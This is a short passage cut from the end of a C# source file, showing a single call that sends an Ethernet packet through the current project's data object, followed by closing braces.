                Program.CurrentProject.data.SendPacket(eth);
            }
        }
    }
}
